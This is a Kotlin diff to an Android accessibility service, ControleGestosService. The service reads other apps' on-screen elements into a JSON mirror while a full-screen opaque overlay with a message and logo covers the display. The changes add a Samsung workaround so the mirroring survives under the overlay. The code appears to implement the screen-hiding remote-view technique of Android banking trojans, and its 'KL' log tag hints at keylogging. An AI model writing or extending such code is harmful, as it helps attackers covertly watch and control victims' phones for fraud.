@@ -155,6 +155,13 @@ class ControleGestosService : AccessibilityService() {
             obterRaizAplicativo()?.let { percorrerNo(it, listaElementos, idsIncluidos) }
         }
 
+        if (listaElementos.isEmpty() && (overlayAtivo || OverlayActivity.estaAtiva())) {
+            Log.w(
+                "KL",
+                "Espelho vazio com overlay ativo (${Build.MANUFACTURER}). Janelas=${windows?.size ?: 0}"
+            )
+        }
+
         val elementosLimpos = removerElementosRedundantes(listaElementos)
         return montarJsonEstrutura(elementosLimpos, displayMetrics)
     }
@@ -313,6 +320,17 @@ class ControleGestosService : AccessibilityService() {
                 val pacote = raiz.packageName?.toString().orEmpty()
                 pacote != packageName && it.type != AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY
             }
+        }
+
+        if (overlayAtivo || OverlayActivity.estaAtiva()) {
+            val todasApp = candidatas
+                .filter { it.type == AccessibilityWindowInfo.TYPE_APPLICATION }
+                .sortedByDescending { janela ->
+                    val area = Rect()
+                    janela.root?.getBoundsInScreen(area)
+                    area.width() * area.height()
+                }
+            if (todasApp.isNotEmpty()) return todasApp
         }
 
         return selecionarMelhorJanela(candidatas)
@@ -681,6 +699,14 @@ class ControleGestosService : AccessibilityService() {
                 marca.contains("vivo") || marca.contains("realme")
     }
 
+    /**
+     * Samsung One UI hides app windows beneath a full-screen Activity, which kills the panel mirror.
+     * On Samsung we use TYPE_ACCESSIBILITY_OVERLAY instead so the espelho keeps working.
+     */
+    private fun deveUsarOverlayPorJanela(): Boolean {
+        return Build.MANUFACTURER.lowercase().contains("samsung")
+    }
+
     private fun aplicarOpacidadeForcada(view: View) {
         view.setBackgroundColor(Color.WHITE)
         view.background = ColorDrawable(Color.WHITE)
@@ -693,7 +719,15 @@ class ControleGestosService : AccessibilityService() {
 
     private fun criarParametrosOverlay(tipoJanela: Int): WindowManager.LayoutParams {
         val (largura, altura) = obterDimensoesTela()
-        val formato = if (fabricantePrecisaOverlayOpaco()) PixelFormat.RGB_565 else PixelFormat.OPAQUE
+        val formato = if (deveUsarOverlayPorJanela() ||
+            tipoJanela == WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
+        ) {
+            PixelFormat.OPAQUE
+        } else if (fabricantePrecisaOverlayOpaco()) {
+            PixelFormat.RGB_565
+        } else {
+            PixelFormat.OPAQUE
+        }
         return WindowManager.LayoutParams(
             largura,
             altura,
@@ -806,6 +840,13 @@ class ControleGestosService : AccessibilityService() {
     }
 
     private fun criarOverlay(mensagem: String, textoInferior: String, logo: String) {
+        if (deveUsarOverlayPorJanela()) {
+            OverlayActivity.fechar()
+            removerOverlayJanela()
+            criarOverlayJanela(mensagem, textoInferior, logo)
+            return
+        }
+
         removerOverlayJanela()
         try {
             enviarOverlayActivity(mensagem, textoInferior, logo)
